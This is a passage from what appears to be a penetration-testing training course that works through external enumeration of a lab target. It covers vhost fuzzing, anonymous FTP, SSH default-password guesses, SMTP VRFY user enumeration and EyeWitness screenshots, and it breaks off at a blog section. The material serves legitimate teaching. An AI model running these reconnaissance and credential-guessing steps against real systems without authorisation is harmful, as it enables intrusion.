<p>The zone transfer works, and we find 9 additional subdomains. In a real-world engagement, if a DNS Zone Transfer is not possible, we could enumerate subdomains in many ways. The <a href="https://dnsdumpster.com/">DNSDumpster.com</a> website is a quick bet. The <code>Information Gathering - Web Edition</code> module lists several methods for <a href="https://academy.hackthebox.com/module/144/section/1252">Passive Subdomain Enumeration</a> and <a href="https://academy.hackthebox.com/module/144/section/1256">Active Subdomain Enumeration</a>.</p>
<p>If DNS were not in play, we could also perform vhost enumeration using a tool such as <code>ffuf</code>. Let&#39;s try it here to see if we find anything else that the zone transfer missed. We&#39;ll use <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/namelist.txt">this</a> dictionary list to help us, which is located at <code>/opt/useful/SecLists/Discovery/DNS/namelist.txt</code> on the Pwnbox.</p>
<p>To fuzz vhosts, we must first figure out what the response looks like for a non-existent vhost. We can choose anything we want here; we just want to provoke a response, so we should choose something that very likely does not exist.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s -I http:/</span>/<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span> -H <span class="hljs-string">"HOST: defnotvalid.inlanefreight.local"</span> | grep <span class="hljs-string">"Content-Length:"</span>

Content-<span class="hljs-string">Length:</span> <span class="hljs-number">15157</span>
</code></pre>
<p>Trying to specify <code>defnotvalid</code> in the host header gives us a response size of <code>15157</code>. We can infer that this will be the same for any invalid vhost so let&#39;s work with <code>ffuf</code>, using the <code>-fs</code> flag to filter out responses with size <code>15157</code> since we know them to be invalid.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w namelist.txt:FUZZ -u http:/</span><span class="hljs-regexp">/10.129.203.101/</span> -H <span class="hljs-string">'Host:FUZZ.inlanefreight.local'</span> -fs <span class="hljs-number">15157</span>

        <span class="hljs-regexp">/'___\  /</span><span class="hljs-string">'___\           /'</span>___\       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       \ \ ,__\\ \ ,__\<span class="hljs-regexp">/\ \/\ \ \ \ </span>,__\      
        \ \ \_<span class="hljs-regexp">/ \ \ \_/\ \ \_\ \ \ \ \_</span>/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \<span class="hljs-regexp">/_/</span>    \<span class="hljs-regexp">/_/</span>   \<span class="hljs-regexp">/___/</span>    \<span class="hljs-regexp">/_/</span>       

       v1<span class="hljs-number">.4</span><span class="hljs-number">.1</span>-dev
________________________________________________

 :: <span class="hljs-string">Method           :</span> GET
 :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//10.129.203.101/</span>
 :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> namelist.txt
 :: <span class="hljs-string">Header           :</span> <span class="hljs-string">Host:</span> FUZZ.inlanefreight.local
 :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
 :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
 :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span>
 :: <span class="hljs-string">Filter           :</span> Response <span class="hljs-string">size:</span> <span class="hljs-number">15157</span>
________________________________________________

blog                    [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">8708</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">1509</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">232</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">143</span>ms]
careers                 [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">51810</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">22044</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">732</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">153</span>ms]
dev                     [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2048</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">643</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">74</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">1262</span>ms]
gitlab                  [<span class="hljs-string">Status:</span> <span class="hljs-number">302</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">113</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">5</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">1</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">226</span>ms]
ir                      [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">28545</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">2888</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">210</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">1089</span>ms]
&lt;REDACTED&gt;              [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">56</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">3</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">4</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">120</span>ms]
status                  [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">917</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">112</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">43</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">126</span>ms]
support                 [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">26635</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">11730</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">523</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">122</span>ms]
tracking                [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">35185</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">10409</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">791</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">124</span>ms]
vpn                     [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">1578</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">414</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">35</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">121</span>ms]
:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">151265</span><span class="hljs-regexp">/151265] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">341</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>] :: <span class="hljs-string">Errors:</span> <span class="hljs-number">0</span> ::
</code></pre>
<p>Comparing the results, we see one vhost that was not part of the results from the DNS Zone Transfer we performed.</p>
<hr>
<h3 id="enumeration-results">Enumeration Results</h3>
<p>From our initial enumeration, we noticed several interesting ports open that we will probe further in the next section. We also gathered several subdomains/vhosts. Let&#39;s add these to our <code>/etc/hosts</code> file so we can investigate each further.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ sudo tee -a /etc/hosts &gt; /dev/<span class="hljs-literal">null</span> &lt;&lt;EOT

<span class="hljs-meta">## inlanefreight hosts </span>
<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span> inlanefreight.<span class="hljs-keyword">local</span> blog.inlanefreight.<span class="hljs-keyword">local</span> careers.inlanefreight.<span class="hljs-keyword">local</span> dev.inlanefreight.<span class="hljs-keyword">local</span> gitlab.inlanefreight.<span class="hljs-keyword">local</span> ir.inlanefreight.<span class="hljs-keyword">local</span> status.inlanefreight.<span class="hljs-keyword">local</span> support.inlanefreight.<span class="hljs-keyword">local</span> tracking.inlanefreight.<span class="hljs-keyword">local</span> vpn.inlanefreight.<span class="hljs-keyword">local</span>
EOT
</code></pre>
<p>In the next section, we&#39;ll dig deeper into the Nmap scan results and see if we can find any directly exploitable or misconfigured services.</p>
<h2 id="service-enumeration-exploitation">Service Enumeration &amp; Exploitation</h2>
<hr>
<h3 id="listening-services">Listening Services</h3>
<p>Our Nmap scans uncovered a few interesting services:</p>
<ul>
<li>Port 21: FTP</li>
<li>Port 22: SSH</li>
<li>Port 25: SMTP</li>
<li>Port 53: DNS</li>
<li>Port 80: HTTP</li>
<li>Ports 110/143/993/995: imap &amp; pop3</li>
<li>Port 111: rpcbind</li>
</ul>
<p>We already performed a DNS Zone Transfer during our initial information gathering, which yielded several subdomains that we&#39;ll dig into deeper later. Other DNS attacks aren&#39;t worth attempting in our current environment.</p>
<hr>
<h3 id="ftp">FTP</h3>
<p>Let&#39;s start with FTP on port 21. The Nmap Aggressive Scan discovered that FTP anonymous login was possible. Let&#39;s confirm that manually.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">ftp</span> <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>

Connected <span class="hljs-built_in">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>.
<span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span>)
Name (<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>:tester): anonymous
<span class="hljs-number">331</span> Please specify <span class="hljs-keyword">the</span> password.
Password:
<span class="hljs-number">230</span> Login successful.
Remote <span class="hljs-keyword">system</span> type is UNIX.
Using binary mode <span class="hljs-built_in">to</span> transfer <span class="hljs-built_in">files</span>.
<span class="hljs-keyword">ftp</span>&gt; ls
<span class="hljs-number">200</span> PORT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">PASV</span>.
<span class="hljs-number">150</span> Here comes <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> listing.
-rw-r<span class="hljs-comment">--r--    1 0        0              38 May 30 17:16 flag.txt</span>
<span class="hljs-number">226</span> Directory <span class="hljs-built_in">send</span> OK.
<span class="hljs-keyword">ftp</span>&gt;
</code></pre>
<p>Connecting with the <code>anonymous</code> user and a blank password works. It does not look like we can access any interesting files besides one, and we also cannot change directories.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">ftp&gt; put test<span class="hljs-selector-class">.txt</span> 

local: test<span class="hljs-selector-class">.txt</span> remote: test<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">200</span> PORT command successful. Consider using PASV.
<span class="hljs-number">550</span> Permission denied.
</code></pre>
<p>We are also unable to upload a file.</p>
<p>Other attacks, such as an FTP Bounce Attack, are unlikely, and we don&#39;t have any information about the internal network yet. Searching for public exploits for vsFTPd 3.0.3 only shows <a href="https://www.exploit-db.com/exploits/49719">this</a> PoC for a <code>Remote Denial of Service</code>, which is out of the scope of our testing. Brute forcing won&#39;t help us here either since we don&#39;t know any usernames.</p>
<p>This looks like a dead end. Let&#39;s move on.</p>
<hr>
<h3 id="ssh">SSH</h3>
<p>Next up is SSH. We&#39;ll start with a banner grab:</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nv <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span> <span class="hljs-number">22</span>

(UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>] <span class="hljs-number">22</span> (ssh) open
SSH<span class="hljs-number">-2.0</span>-OpenSSH_8<span class="hljs-number">.2</span>p1 Ubuntu<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.5</span>
</code></pre>
<p>This shows us that the host is running OpenSSH version 8.2, which has no known vulnerabilities at the time of writing. We could try some password brute-forcing, but we don&#39;t have a list of valid usernames, so it would be a shot in the dark. It&#39;s also doubtful that we&#39;d be able to brute-force the root password. We can try a few combos such as <code>admin:admin</code>, <code>root:toor</code>, <code>admin:Welcome</code>, <code>admin:Pass123</code> but have no success.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh admin@<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>

The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">'10.129.203.101 (10.129.203.101)' can't be established.</span>
ECDSA <span class="hljs-keyword">key</span> fingerprint <span class="hljs-keyword">is</span> SHA256:<span class="hljs-number">3</span>I77Le3AqCEUd+<span class="hljs-number">1</span>LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes
Warning: Permanently added <span class="hljs-comment">'10.129.203.101' (ECDSA) to the list of known hosts.</span>
admin@<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span><span class="hljs-comment">'s password: </span>
Permission denied, please <span class="hljs-keyword">try</span> again.
</code></pre>
<p>SSH looks like a dead end as well. Let&#39;s see what else we have.</p>
<hr>
<h4 id="email-services">Email Services</h4>
<p>SMTP is interesting. We can consult the <a href="https://academy.hackthebox.com/module/116/section/1173">Attacking Email Services</a> section of the <code>Attacking Common Services</code> module for help. In a real-world assessment, we could use a website such as <a href="https://mxtoolbox.com/">MXToolbox</a> or the tool <code>dig</code> to enumerate MX Records.</p>
<p>Let&#39;s do another scan against port 25 to look for misconfigurations.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nmap -sV -sC -p25 <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>

Starting Nmap <span class="hljs-number">7.92</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2022-06-20 18:55 EDT</span>
Nmap scan report <span class="hljs-keyword">for</span> inlanefreight.local (<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>)
Host is up (<span class="hljs-number">0.11</span>s latency).

PORT   STATE SERVICE VERSION
<span class="hljs-number">25</span>/tcp open  smtp    Postfix smtpd
| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=ubuntu
| Subject Alternative <span class="hljs-string">Name:</span> <span class="hljs-string">DNS:</span>ubuntu
| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2022</span><span class="hljs-number">-05</span><span class="hljs-number">-30</span><span class="hljs-string">T17:</span><span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2032</span><span class="hljs-number">-05</span><span class="hljs-number">-27</span><span class="hljs-string">T17:</span><span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_smtp-<span class="hljs-string">commands:</span> ubuntu, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-<span class="hljs-string">date:</span> TLS randomness does not represent time
Service <span class="hljs-string">Info:</span> <span class="hljs-string">Host:</span>  ubuntu

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">5.37</span> second
</code></pre>
<p>Next, we&#39;ll check for any misconfigurations related to authentication. We can try to use the <code>VRFY</code> command to enumerate system users.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ telnet <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.101</span> <span class="hljs-number">25</span>

Trying <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.101</span>...
Connected to <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.101</span>.
Escape character is <span class="hljs-string">'^]'</span>.
<span class="hljs-number">220</span> ubuntu ESMTP Postfix (Ubuntu)
VRFY root
<span class="hljs-number">252</span> <span class="hljs-number">2.0</span><span class="hljs-meta">.0</span> root
VRFY www-data
<span class="hljs-number">252</span> <span class="hljs-number">2.0</span><span class="hljs-meta">.0</span> www-data
VRFY randomuser
<span class="hljs-number">550</span> <span class="hljs-number">5.1</span><span class="hljs-meta">.1</span> &lt;randomuser&gt;: Recipient address rejected: User unknown <span class="hljs-keyword">in</span> local recipient table
</code></pre>
<p>We can see that the <code>VRFY</code> command is not disabled, and we can use this to enumerate valid users. This could potentially be leveraged to gather a list of users we could use to mount a password brute-forcing attack against the FTP and SSH services and perhaps others. Though this is relatively low-risk, it&#39;s worth noting down as a <code>Low</code> finding for our report as our clients should reduce their external attack surface as much as possible. If this is no valid business reason for this command to be enabled, then we should advise them to disable it.</p>
<p>We could attempt to enumerate more users with a tool such as <a href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a> to drive the point home and potentially find more users. It&#39;s typically not worth spending much time brute-forcing authentication for externally-facing services. This could cause a service disruption, so even if we can make a user list, we can try a few weak passwords and move on.</p>
<p>We could repeat this process with the <code>EXPN</code> and <code>RCPT TO</code> commands, but it won&#39;t yield anything additional.</p>
<p>The <code>POP3</code> protocol can also be used for enumerating users depending on how it is set up. We can try to enumerate system users with the <code>USER</code> command again, and if the server replies with <code>+OK</code>, the user exists on the system. This doesn&#39;t work for us. Probing port 995, the SSL/TLS port for POP3 doesn&#39;t yield anything either.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ telnet <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span> <span class="hljs-number">110</span>

Trying <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>...
Connected to <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
user www-data
-ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
</code></pre>
<p>The <a href="https://academy.hackthebox.com/module/112/section/1073">Footprinting</a> module contains more information about common services and enumeration principles and is worth reviewing again after working through this section.</p>
<p>We&#39;d want to look further at the client&#39;s email implementation in a real-world assessment. If they are using Office 365 or on-prem Exchange, we may be able to mount a password spraying attack that could yield access to email inboxes or potentially the internal network if we can use a valid email password to connect over VPN. We may also come across an Open Relay, which we could possibly abuse for Phishing by sending emails as made-up users or spoofing an email account to make an email look official and attempt to trick employees into entering credentials or executing a payload. Phishing is out of scope for this particular assessment and likely will be for most External Penetration Tests, so this type of vulnerability would be worth confirming and reporting if we come across it, but we should not go further than simple validation without checking with the client first. However, this could be extremely useful on a full-scope red team assessment.</p>
<p>We can check for it anyways but do not find an open relay which is good for our client!</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -p25 -Pn <span class="hljs-comment">--script smtp-open-relay  10.129.203.101</span>

Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) at <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">20</span> <span class="hljs-number">19</span>:<span class="hljs-number">14</span> EDT
Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> inlanefreight.local (<span class="hljs-number">10.129</span>.<span class="hljs-number">203.101</span>)
Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.12</span>s latency).

<span class="hljs-keyword">PORT</span>   STATE SERVICE
<span class="hljs-number">25</span>/tcp <span class="hljs-keyword">open</span>  smtp
|_smtp-<span class="hljs-keyword">open</span>-relay: Server doesn<span class="hljs-symbol">'t</span> seem <span class="hljs-keyword">to</span> be an <span class="hljs-keyword">open</span> relay, <span class="hljs-keyword">all</span> tests failed

Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">24.30</span> seconds
</code></pre>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Port 111 is the <code>rpcbind</code> service which should not be exposed externally, so we could write up a <code>Low</code> finding for <code>Unnecessary Exposed Services</code> or similar. This port can be probed to fingerprint the operating system or potentially gather information about available services. We can try to probe it with the <a href="https://linux.die.net/man/8/rpcinfo">rpcinfo</a> command or Nmap. It works, but we do not get back anything useful. Again, worth noting down so the client is aware of what they are exposing but nothing else we can do with it.</p>
<p>Service Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ rpcinfo <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.101</span>

   program version netid     address                service    owner
    <span class="hljs-number">100000</span>    <span class="hljs-number">4</span>    tcp6      ::.<span class="hljs-number">0.111</span>               portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">3</span>    tcp6      ::.<span class="hljs-number">0.111</span>               portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">4</span>    udp6      ::.<span class="hljs-number">0.111</span>               portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">3</span>    udp6      ::.<span class="hljs-number">0.111</span>               portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">4</span>    tcp       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.111</span>          portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">3</span>    tcp       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.111</span>          portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">2</span>    tcp       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.111</span>          portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">4</span>    udp       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.111</span>          portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">3</span>    udp       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.111</span>          portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">2</span>    udp       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.111</span>          portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">4</span>    local     /run/rpcbind.sock      portmapper superuser
    <span class="hljs-number">100000</span>    <span class="hljs-number">3</span>    local     /run/rpcbind.sock      portmapper superuser
</code></pre>
<p>It&#39;s worth consulting this HackTricks guide on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind">Pentesting rpcbind</a> for future awareness regarding this service.</p>
<p>The last port is port <code>80</code>, which, as we know, is the HTTP service. We know there are likely multiple web applications based on the subdomain and vhost enumeration we performed earlier. So, let&#39;s move on to web. We still don&#39;t have a foothold or much of anything aside from a handful of medium and low-risk findings. In modern environments, we rarely see externally exploitable services like a vulnerable FTP server or similar that will lead to remote code execution (RCE). Never say never, though. We have seen crazier things, so it is always worth exploring every possibility. Most organizations we face will be most susceptible to attack through their web applications as these often present a vast attack surface, so we&#39;ll typically spend most of our time during an External Penetration test enumerating and attacking web applications.</p>
<h2 id="web-enumeration-exploitation">Web Enumeration &amp; Exploitation</h2>
<hr>
<p>As mentioned in the previous section, web applications are where we usually spend most of our time during an External Penetration Test. They often present a vast attack surface and can suffer from many classes of vulnerabilities that can lead to remote code execution or sensitive data exposure, so we should be thorough with them. One thing to remember is that there is a difference between a <code>Web Application Security Assessment (WASA)</code> and an <code>External Penetration Test</code>. In a WASA, we are typically tasked with finding and reporting any and all vulnerabilities, no matter how mundane (i.e., a web server version in the HTTP response headers, a cookie missing the Secure or HttpOnly flag, etc.). We don&#39;t want to get bogged down with these types of findings during an External Penetration Test since we typically have a lot of ground to cover. The Scope of Work (SoW) document should clearly differentiate between the two assessment types. It should explicitly state that during an External Penetration Test, we will perform <code>cursory</code> web application testing, looking for high-risk vulnerabilities. If we don&#39;t have many findings at all, we can dig into the web applications deeper, and we can always include a catch-all <code>Best Practice Recommendation</code> or <code>Informational</code> finding that lists out several common security-related HTTP response header issues that we see all the time, among other minor issues. This way, we&#39;ve fulfilled the contract by going after the big issues such as SQL injection, unrestricted file upload, XSS, XXE, file inclusion attacks, command injections, etc., but covered ourselves with the informational finding in case the client comes back asking why we didn&#39;t report X.</p>
<hr>
<h3 id="web-application-enumeration">Web Application Enumeration</h3>
<p>The quickest and most efficient way to get through a bunch of web applications is using a tool such as <a href="https://github.com/FortyNorthSecurity/EyeWitness">EyeWitness</a> to take screenshots of each web application as covered in the <code>Attacking Common Applications</code> module in the <a href="https://academy.hackthebox.com/module/113/section/1088">Application Discovery &amp; Enumeration</a> section. This is particularly helpful if we have a massive scope for our assessment and browsing each web application one at a time is not feasible. In our case, we have <code>11</code> subdomains/vhosts (for now), so it&#39;s worth firing up EyeWitness to help us out as we want to be as efficient as possible to give the client the best possible assessment. This means speeding up any tasks that can be performed <code>faster</code> and more efficiently <code>without the possibility of missing things</code>. Automation is great, but if we&#39;re missing half of whatever we&#39;re going after, then the automation is doing more harm than good. Make sure you understand what your tools are doing, and periodically spot-check things to ensure your tools and any custom scripts are working as expected.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat ilfreight_subdomains

inlanefreight<span class="hljs-selector-class">.local</span> 
blog<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
careers<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
gitlab<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
ir<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
status<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
support<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
tracking<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> 
vpn<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
monitoring<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
</code></pre>
<p>We can feed EyeWitness an Nmap .xml file or a Nessus scan, which is useful when we have a large scope with many open ports, which can often be the case during an Internal Penetration Test. In our case, we&#39;ll just use the <code>-f</code> flag to give it the list of subdomains in a text file we enumerated earlier.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https:<span class="hljs-comment">//www.fortynorthsecurity.com           #</span>
################################################################################

Starting Web Requests (<span class="hljs-number">11</span> Hosts)
Attempting to screenshot http:<span class="hljs-comment">//inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//blog.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//careers.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//dev.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//gitlab.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//ir.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//status.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//support.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//tracking.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//vpn.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//monitoring.inlanefreight.local</span>
Finished <span class="hljs-keyword">in</span> <span class="hljs-number">34.79010033607483</span> seconds

[*] Done! Report written <span class="hljs-keyword">in</span> the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
n
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/163/ilfreight\_eyewitness.png" alt="text"></p>
<p>The EyeWitness results show us multiple very interesting hosts, any one of which could potentially be leveraged to gain a foothold into the internal network. Let&#39;s work through them one by one.</p>
<hr>
<h3 id="blog-inlanefreight-local">blog.inlanefreight.local</h3>
